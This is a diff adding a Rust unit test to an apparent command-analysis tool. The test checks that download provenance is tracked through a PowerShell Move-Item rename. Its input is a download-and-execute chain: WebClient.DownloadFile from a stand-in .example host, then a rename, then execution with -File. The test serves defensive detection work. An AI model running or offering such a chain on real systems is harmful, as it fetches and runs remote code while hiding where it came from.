@@ -18404,6 +18404,28 @@ powershell -NoProfile -File "%TEMP%\copied.ps1""#,
     }
 
     #[test]
+    fn powershell_move_item_preserves_download_provenance() {
+        let report = analyze(
+            br#"powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://ps-move-item-provenance.example/stage.ps1','%TEMP%\downloaded.ps1')"
+powershell -Command "Move-Item -Path '%TEMP%\downloaded.ps1' -Destination '%TEMP%\moved.ps1'"
+powershell -NoProfile -File "%TEMP%\moved.ps1""#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd.contains("-File")
+                        && cmd.contains("moved.ps1")
+                        && url == "https://ps-move-item-provenance.example/stage.ps1"
+            )),
+            "PowerShell Move-Item script execution did not resolve original download URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_file_current_dir_nested_tracks_script_content() {
         let mut env = Environment::new(&Config::default());
         let ps1 =
